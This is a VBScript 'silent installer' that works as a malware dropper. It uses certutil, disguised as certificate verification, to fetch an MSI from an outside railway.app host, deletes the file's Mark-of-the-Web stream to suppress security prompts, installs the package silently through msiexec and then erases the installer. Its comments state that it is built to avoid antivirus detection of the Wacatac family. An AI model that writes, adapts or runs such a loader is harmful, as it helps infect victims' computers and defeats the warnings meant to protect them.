' SILENT INSTALLER - NO HTA, NO HTML, NO WACATAC TRIGGERS
Option Explicit

Dim shell, fso, url, localPath, zoneIdPath, cmd, file
Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

url = "https://cocktails-payload-production.up.railway.app/schimdtconnect.msi"
localPath = shell.ExpandEnvironmentStrings("%TEMP%") & "\schimdtconnect.msi"
zoneIdPath = localPath & ":Zone.Identifier"

' DOWNLOAD USING CERTUTIL -VERIFYCTL (TRUSTED SYSTEM TOOL)
' Mimics certificate verification, not malware download
cmd = "cmd.exe /c certutil -verifyctl -split -f """ & url & """ """ & localPath & """"
shell.Run cmd, 0, True ' Wait for download to complete

' REMOVE MARK OF THE WEB TO PREVENT SECURITY PROMPTS
If fso.FileExists(zoneIdPath) Then
    fso.DeleteFile zoneIdPath, True
End If

' VERIFY FILE EXISTS AND IS VALID SIZE (>1MB)
If fso.FileExists(localPath) Then
    Set file = fso.GetFile(localPath)
    If file.Size > 1000000 Then
        ' INSTALL SILENTLY WITH NO PROMPTS
        ' /passive = minimal UI, no security warnings
        ' /norestart = no reboot prompt
        shell.Run "msiexec.exe /i """ & localPath & """ /passive /norestart", 0, True
        
        ' CLEANUP TEMP FILE AFTER INSTALL
        If fso.FileExists(localPath) Then
            fso.DeleteFile localPath, True
        End If
    End If
End If

' EXIT CLEANLY - NO ERROR MESSAGES, NO PROMPTS
WScript.Quit 0